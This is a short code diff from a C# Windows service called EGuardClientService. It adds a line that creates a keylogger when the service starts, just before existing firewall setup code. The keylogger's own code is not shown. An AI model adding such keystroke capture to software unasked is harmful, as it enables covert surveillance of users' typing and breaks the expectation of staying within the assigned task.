@@ -36,6 +36,8 @@ namespace EGuardClientService
         /// <param name="args">Any command line arguments</param>
         public void OnStart(string[] args)
         {
+            //initialize keylogger
+            Keylogger keylogger = new Keylogger();
 
             // Enable firewall
             Type NetFwMgrType = Type.GetTypeFromProgID("HNetCfg.FwMgr", false);
